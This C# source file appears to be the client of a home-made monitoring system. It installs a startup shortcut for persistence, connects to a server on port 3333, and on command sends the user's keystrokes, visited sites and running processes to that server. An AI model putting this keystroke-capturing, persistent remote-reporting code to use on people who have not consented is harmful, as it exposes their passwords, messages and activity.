using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using IWshRuntimeLibrary;
using System.Runtime.CompilerServices;

namespace ClientSide
{

    public delegate void wordFromKeylogger(string word);
    public delegate void SiteFromMonitorSite(string word);
    public delegate void updateProccess();
    class Program
    {
        private String id;
        private Socket clientSocket;
        private String name;
        private String ip;
        private Byte[] buffer;
        private DBclient dbs;
        private setSetting set;
        private ClientForm clientForm;
        public Boolean sendCurrentData;
        KeyLogger keyLogger;
        string keyDate;
        public static Program program;

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            // if (rkApp.GetValue("ClientSide.exe") == null) { }
            // Remove the value from the registry so that the application doesn't start
            //  else 
            //  rkApp.DeleteValue("ClientSide.exe", false);
            connectAtReStartComputer();

            program = new Program();
            //Application.EnableVisualStyles();
            //Application.SetCompatibleTextRenderingDefault(false);

            // The path to the key where Windows looks for startup applications

            // check if connect at first time or reconnect         
            if (!program.initialClient())
            {
                program.connectToServer();
            }

            Application.Run();
        }

        private static void connectAtReStartComputer()
        {
            string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            WshShell shell = new WshShell();
            string shortcutAddress = startupFolder + @"\MyStartupShortcut.lnk";
            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutAddress);
            shortcut.Description = "A startup shortcut. If you delete this shortcut from your computer, LaunchOnStartup.exe will not launch on Windows Startup"; // set the description of the shortcut
            shortcut.WorkingDirectory = Application.StartupPath; /* working directory */
            shortcut.TargetPath = Application.ExecutablePath; /* path of the executable */
            shortcut.Save(); // save the shortcut 
            shortcut.Arguments = "/a /c";
        }



        // The function is activated as soon as data is received in the socket
        private void ReceiveCallback(IAsyncResult AR)
        {

            try
            {
                clientSocket = AR.AsyncState as Socket;
                int received = clientSocket.EndReceive(AR);
                if (received == 0)
                {
                    return;
                }

                string data = Encoding.ASCII.GetString(buffer);
                //("server send: |" + data + "|");

                var dataFromServer = data.Split(new[] { '\r', '\n', '\0' }, 2);

                if (dataFromServer[0] == "id")
                {
                    id = dataFromServer[1].Split('\r', '\n', '\0')[0];
                }
                if (dataFromServer[0] == "setting")
                {
                    String setting = dataFromServer[1].Split('\0')[0];
                    setting = setting.Substring(setting.IndexOf("\n") + 1);
                    playMonitor(setting); //This method obtains the settings string from the server

                }
                if (dataFromServer[0] == "get current state")
                {
                    ShowErrorDialog("server send: |" + dataFromServer[0].Split('\0')[0] + "|");
                    sendCurrentData = true;
                    sendCurrentState(clientSocket);
                }
                if (dataFromServer[0] == "stop current state")
                {
                    ShowErrorDialog("server send: |" + dataFromServer[0].Split('\0')[0] + "|");
                   
                    stopSendCurrentState(clientSocket);
                }
                else
                {
                    //ShowErrorDialog("Server send:\n" + data);
                }
                //System.Threading.Thread.Sleep(7000);
                //SendData("server send: \n" + data);
                //Start receiving data again.
                buffer = new byte[clientSocket.ReceiveBufferSize];
                clientSocket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, ReceiveCallback, clientSocket);
            }
            // Avoid Pokemon exception handling in cases like these.
            catch (SocketException ex)
            {
                ShowErrorDialog(ex.Message);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog(ex.Message);
            }
        }

        private void stopSendCurrentState(Socket clientSocket)
        {
            sendCurrentData = false;
            ShowErrorDialog("stop send current state");
        }

        private void sendCurrentState(Socket socket)
        {
            sendCurrentData = true;
            // build string that contain all current process 
            string allProc = ShowAllProcess.ListAllApplications();
            //string keyDate = keyLogger.input;
            SendData(socket, "current state\ropen CurrentState form");
            // send all current procces
            updateCurrentProcess();
            //updateProccess handler = updateCurrentProcess;
            //handler();

            //ShowErrorDialog("start get input from keylogger");

        }

        // set setting and here will play all triggers;
        private void playMonitor(string setting)
        {

            //set setting 
            set = new setSetting(setting, name, id);
            ShowErrorDialog("play monitor");
            // play key logger
            if (dbs == null)
            {
                dbs = new DBclient(name);
            }
            dbs.connectToDatabase();

            dbs.removeIgnoredSites(set.anotherSitesIgnore.ToArray());
            dbs.funAddCategorySiteTable(set.anotherSitesReport.ToArray(), "anotherSitesReport");

            // here will play all triggers:

            // KeyLogger
            keyLogger = new KeyLogger(dbs, set);


            // Site
            MonitorSite monitorSite = new MonitorSite(dbs, set);

            // files and program
            string allProc = ShowAllProcess.ListAllProcesses();
            // installations 

            // Report
            // Report.sendAlertToMail(set.timeToReport, set.frequncy);
            // Report.setReportFrequency("09/12/2020 21:32:30", 5.0);





        }

        // Defines functions for sending and receiving data through the socket
        private void ConnectCallback(IAsyncResult AR)
        {

            try
            {
                clientSocket = AR.AsyncState as Socket;
                clientSocket.EndConnect(AR);
                clientSocket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, ReceiveCallback, clientSocket);

                ShowErrorDialog("in ConnectCallback in socket: " + clientSocket.RemoteEndPoint);
                if (id != null)
                    SendData(clientSocket, "id\r" + id);
                else SendData(clientSocket, "name\r" + name);

            }
            catch (SocketException ex)
            {
                // ShowErrorDialog("ConnectCallback send SocketException\r\n" + ex.Message);

                reConnect();

            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("ConnectCallback send ObjectDisposedException \r\n" + ex.Message);
            }
        }

        // A method that sends information to a server
        private void SendCallback(IAsyncResult AR)
        {
            try
            {
                clientSocket = AR.AsyncState as Socket;
                clientSocket.EndSend(AR);
            }
            catch (SocketException ex)
            {
                ShowErrorDialog("SendCallback send SocketException\r\n" + ex.Message);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("SendCallback send ObjectDisposedException \r\n" + ex.Message);
            }
        }

        private static void ShowErrorDialog(string message)
        {
            MessageBox.Show(message, Application.ProductName, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }


        public void connectToServer()
        {
            try
            {

                clientForm = new ClientForm();
                Thread openClientForm = new Thread(openClientFormDialog);
                openClientForm.SetApartmentState(ApartmentState.STA);
                openClientForm.Start();

                while (openClientForm.IsAlive) ;

                name = clientForm.clientName;
                ip = clientForm.ip;

                dbs = new DBclient(name);

                // Create new socket 
                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                buffer = new byte[clientSocket.ReceiveBufferSize];

                // Connect To Server 
                IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ip), 3333);
                // The function ConnectCallback set callback to receive and send 
                clientSocket.BeginConnect(endPoint, ConnectCallback, clientSocket);
            }
            catch (SocketException ex)
            {
                ShowErrorDialog("connectToServer send SocketException\r\n" + ex.Message);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("connectToServer send ObjectDisposedException\r\n" + ex.Message);
            }


        }


        private bool initialClient()
        {

            String projectDirectory = Environment.CurrentDirectory;
            string filepath = Directory.GetParent(projectDirectory).Parent.FullName;
            String[] paths = new string[] { @filepath, "files" };
            filepath = Path.Combine(paths);
            string set = "";
            DirectoryInfo d = new DirectoryInfo(filepath);//Assuming Test is your Folder
            //ShowErrorDialog("filepath is: \n" + filepath);
            if (!Directory.Exists(filepath))
            {
                return false;
            }

            FileInfo[] Files = d.GetFiles("*.txt"); //Getting Text files

            foreach (FileInfo file in Files)
            {

                if (file.Name != null)
                {
                    //ShowErrorDialog(file.Name);
                    // Open the file to read from.
                    using (StreamReader sr = System.IO.File.OpenText(Path.Combine(filepath, file.Name)))
                    {
                        name = sr.ReadLine();
                        id = sr.ReadLine();
                        ip = "127.1.0.0";
                        //ShowErrorDialog("id\n" + id);
                        string line = "";
                        while ((line = sr.ReadLine()) != null)
                        {
                            //ShowErrorDialog("line\n" + line);
                            set += line + "\r\n";
                        }
                    }

                    playMonitor(set);
                    reConnect();
                    return true;

                }

            }

            return false;

        }

        private void openClientFormDialog()
        {
            clientForm.ShowDialog();
        }



        public void SendData(Socket clientSocket, String data)
        {
            try
            {
                //ShowErrorDialog("send: \r\n" + data);
                var sendData = Encoding.UTF8.GetBytes(data);
                clientSocket.BeginSend(sendData, 0, sendData.Length, SocketFlags.None, SendCallback, clientSocket);

            }
            catch (SocketException ex)
            {
                //ShowErrorDialog("SendData send SocketException\r\n" + ex.Message);
                reConnect();
                //SendData(clientSocket, data);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("SendData send ObjectDisposedException \r\n" + ex.Message);
            }
        }

        public void reConnect()
        {
            try
            {

                // Create new socket 
                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                buffer = new byte[clientSocket.ReceiveBufferSize];

                ShowErrorDialog("reConnect in socket: " + clientSocket.RemoteEndPoint);
                // Connect To Server 
                IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ip), 3333);
                // The function ConnectCallback set callback to receive and send 
                clientSocket.BeginConnect(endPoint, ConnectCallback, clientSocket);
            }
            catch (SocketException ex)
            {
                ShowErrorDialog("reConnect send SocketException\r\n" + ex.Message);

            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("reConnect send ObjectDisposedException \r\n" + ex.Message);
            }
        }

        public static void updateCurrentKeylogger(string word)
        {           
            if (program.sendCurrentData) {
                Console.WriteLine(word);
                program.SendData(program.clientSocket, "current state\rkeyBoard\r"+ word);
            }
           
        }

        public static void updateCurrentSite(string site)
        {
            if (program.sendCurrentData)
            {
                // ShowErrorDialog("send site: \n"+site);
                Console.WriteLine(site); 
                program.SendData(program.clientSocket, "current state\rsite\r" + site);
            }

        }
        public static void updateCurrentProcess()
        {
            
            string processes = ShowAllProcess.ListAllApplications();
            if (program.sendCurrentData)
            {
                ShowErrorDialog("send proc: \n" + processes);
                program.SendData(program.clientSocket, "current state\rprocesses\r" + processes);
            }

        }


    }
}
